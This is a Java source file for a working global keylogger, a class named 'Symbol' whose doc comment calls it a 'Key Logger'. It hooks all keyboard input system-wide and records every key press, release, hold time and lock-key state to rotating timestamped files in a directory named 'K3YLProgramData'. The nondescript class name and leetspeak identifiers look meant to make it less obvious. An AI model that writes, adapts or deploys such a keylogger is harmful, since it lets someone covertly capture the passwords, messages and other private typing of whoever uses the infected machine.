package root.Symbol;

import java.awt.Toolkit;
import java.awt.event.KeyEvent;
import java.io.Closeable;
import java.io.File;
import java.io.FileNotFoundException;
import java.io.IOException;
import java.io.PrintWriter;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.List;
import java.util.concurrent.atomic.AtomicBoolean;

import lc.kra.system.keyboard.GlobalKeyboardHook;
import lc.kra.system.keyboard.event.GlobalKeyEvent;
import lc.kra.system.keyboard.event.GlobalKeyListener;
import root.util.IOUtils;

/**
 * Key Logger
 *
 */
public class Symbol implements Closeable {

	// Enables SYSOUT invocations
	public final AtomicBoolean CONSOLE_ENABLED = new AtomicBoolean(false);

	// CapsLock key status
	private static final AtomicBoolean CAPS_LOCK_STATE = new AtomicBoolean(false),
			// NumLock key status
			NUM_LOCK_STATE = new AtomicBoolean(false);

	// Approximately 1MB
	public static final int K3Y_LOGS_FILE_SIZE_MAX = 1000;// 1024 * 1024;

	static
	{
		/**
		 * On Windows platform the state of all locking keys is cached in the AWT native
		 * code, in m_lastKeyboardState field of AwtToolkit. This cache is initialized
		 * when toolkit is created. So Toolkit will return state of capsLock when
		 * toolkit was created first time during execution, later state of capsLock in
		 * cache is never updated.
		 */
		CAPS_LOCK_STATE.set(Toolkit.getDefaultToolkit().getLockingKeyState(KeyEvent.VK_CAPS_LOCK));
		NUM_LOCK_STATE.set(Toolkit.getDefaultToolkit().getLockingKeyState(KeyEvent.VK_NUM_LOCK));
	}

	// System.currentTimeMillis() when certain key was pressed, so as to compute key
	// hold time, considering only for backspace and delete so as to know whether
	// single character was erased or multiple while typing certain text
	private volatile long vkBackDownTime, vkDeleteDownTime;

	private GlobalKeyboardHook keyboardHook;
	private GlobalKeyListener keyListener;

	private volatile boolean isAlive = false;

	// Virtual key codes for current keys down
	private final List<Long> keysDown = new ArrayList<>();

	private File k3YLProgramData;
	private PrintWriter printWriter;
	private volatile int k3yLogsFileSize;

	public Symbol(boolean consoleEnabled) {
		this.CONSOLE_ENABLED.set(consoleEnabled);
		keyListener = GlobalKeyListener.createKeyListener(this::whenKeyPressed, this::whenKeyReleased);

		// Naive notification for execution of non parameterized constructor
		System.out.print(".");
	}

	public Symbol(final boolean consoleEnabled, File outputFileDirPath) throws FileNotFoundException {
		this(consoleEnabled);

		outputFileDirPath = new File(outputFileDirPath, "K3YLProgramData");

		if (!outputFileDirPath.exists())
		{
			if (outputFileDirPath.mkdir())
				println("Created outputFileDirPath: " + outputFileDirPath);
			else
				throw new RuntimeException("Failed to create directory: " + outputFileDirPath);

		} else
			println("Exists! So using same, outputFileDirPath: " + outputFileDirPath);
		k3YLProgramData = outputFileDirPath;

		File k3yLogsFile = new File(k3YLProgramData,
				new SimpleDateFormat("dd.MM.yyyy.HH.mm.ss").format(new Date()).toString());
		printWriter = new PrintWriter(k3yLogsFile);

		// Naive notification for execution of parameterized constructor
		System.out.print(".");
	}

	private boolean isKeyOnHold(long currentKeyPress) {
		return keysDown.contains(currentKeyPress);
	}

	private void whenKeyPressed(GlobalKeyEvent event) {
		long virtualKeyCode = event.getVirtualKeyCode();

		if (!isKeyOnHold(virtualKeyCode))
		{
			keysDown.add(virtualKeyCode);

			String logTag = null;
			switch ((int) virtualKeyCode)
			{

			case GlobalKeyEvent.VK_CAPITAL:
				toggleAtomicBoolean(CAPS_LOCK_STATE);
				logTag = String.format("<%d value=\"%s\">", virtualKeyCode, CAPS_LOCK_STATE.get());
				break;

			case GlobalKeyEvent.VK_NUMLOCK:
				toggleAtomicBoolean(NUM_LOCK_STATE);
				logTag = String.format("<%d value=\"%s\">", virtualKeyCode, NUM_LOCK_STATE.get());
				break;

			case GlobalKeyEvent.VK_BACK:
				vkBackDownTime = System.currentTimeMillis();
				logTag = String.format("<%d>", virtualKeyCode);
				break;
			case GlobalKeyEvent.VK_DELETE:
				vkDeleteDownTime = System.currentTimeMillis();
				logTag = String.format("<%d>", virtualKeyCode);
				break;

			default:
				logTag = String.format("<%d>", virtualKeyCode);
				break;
			}
			print(logTag);
		}
	}

	private void whenKeyReleased(GlobalKeyEvent event) {
		String log = null;
		long virtualKeyCode = event.getVirtualKeyCode();

		if (keysDown.contains(virtualKeyCode))
		{
			keysDown.remove(virtualKeyCode);

			switch ((int) virtualKeyCode)
			{
			case GlobalKeyEvent.VK_BACK:
				log = String.format("<Hold value=\"%d\"/></%d>", (System.currentTimeMillis() - vkBackDownTime),
						virtualKeyCode);
				break;

			case GlobalKeyEvent.VK_DELETE:
				log = String.format("<Hold value=\"%d\"/></%d>", (System.currentTimeMillis() - vkDeleteDownTime),
						virtualKeyCode);
				break;

			default:
				log = String.format("</%d>", virtualKeyCode);
				break;
			}// END of switch
		} else
			log = String.format("<Error value=\"%s\"/>", "IMPAIRED_RELEASE: " + virtualKeyCode);

		print(log);
	}

	private void print(Object log) {
		if (CONSOLE_ENABLED.get())
			System.out.print(log);

		if (printWriter != null)
			writeToFile(log.toString());
	}

	private void println(Object log) {
		if (CONSOLE_ENABLED.get())
			System.out.println(log);

		if (printWriter != null)
			writeToFile(log.toString() + "\n");
	}

	private void writeToFile(String data) {
		try
		{
			printWriter.print(data);
			printWriter.flush();
			k3yLogsFileSize += data.length();

			// Ensure k3yLogsFile size do not exceed K3Y_LOGS_FILE_SIZE_MAX
			if (k3yLogsFileSize >= K3Y_LOGS_FILE_SIZE_MAX)
			{
				printWriter.flush();
				printWriter.close();
				k3yLogsFileSize = 0;

				File newK3yLogsFile = new File(k3YLProgramData,
						new SimpleDateFormat("dd.MM.yyyy.HH.mm.ss").format(new Date()).toString());
				printWriter = new PrintWriter(newK3yLogsFile);
			}
		} catch (Exception e)
		{
			println(e);
		}
	}

	/**
	 * Would not return till SymbolInstance.isAlive() returns true
	 */
	public void start() {
		if (!isAlive)
		{
			keyboardHook = new GlobalKeyboardHook();
			keyboardHook.addKeyListener(keyListener);
			isAlive = true;

			println("<Symbol>");
			println("<CAPS_LOCK_STATE value=\"" + CAPS_LOCK_STATE.get() + "\"/>");
			println("<NUM_LOCK_STATE value=\"" + NUM_LOCK_STATE.get() + "\"/>");

			// Naive notification for start operation
			System.out.println("*");

			while (isAlive())
			{
				try
				{
					Thread.sleep(5000);
				} catch (InterruptedException e)
				{
					// Naive notification for interruption to main thread
					// , but nothing to do
					System.err.print("~");
				}
			} // END of while
		}
	}

	public boolean isAlive() {
		return isAlive && keyboardHook.isAlive();
	}

	@Override
	public void close() throws IOException {
		IOUtils.closeQuietly(printWriter);
		keyboardHook.shutdownHook();
		isAlive = false;

		println("</Symbol>");

		// Naive notification for stop operation
		System.out.print("!");
	}

	private static void toggleAtomicBoolean(final AtomicBoolean FLAG) {
		if (!FLAG.compareAndSet(true, false))
			FLAG.compareAndSet(false, true);
	}

	public static void main(String args[]) {
		Symbol symbol = null;
		try
		{
			String outputFileDirPath = null;
			boolean consoleEnabled = false;

			if (args.length == 0)
			{
				StringBuilder usage = new StringBuilder();
				usage.append("Usage:\n");
				usage.append("java Symbol -console\n");
				usage.append("java Symbol outputFileDirPath\n");
				usage.append("java Symbol -console outputFileDirPath\n");
				usage.append("(To start key logger and write keystrokes at directory outputFileDirPath)\n");
				usage.append("Where option -console start program in console mode\n");
				usage.append("Current Working Directory: ");
				usage.append(System.getProperty("user.dir"));
				usage.append("\n");

				System.out.println(usage);
				System.exit(0);
			} else if (args.length <= 2)
			{
				for (String arg : args)
				{
					if (arg.equalsIgnoreCase("-console"))
						consoleEnabled = true;
					else
						outputFileDirPath = arg;
				}
			} else
			{
				System.err.println("Invalid arguments! Check usage");
				System.exit(0);
			}

			if (outputFileDirPath == null)
				symbol = new Symbol(consoleEnabled);
			else
				symbol = new Symbol(consoleEnabled, new File(outputFileDirPath));
			symbol.start();

		} catch (Exception e)
		{
			e.printStackTrace();
		} finally
		{
			IOUtils.closeQuietly(symbol);
		}

	}// END of main

}
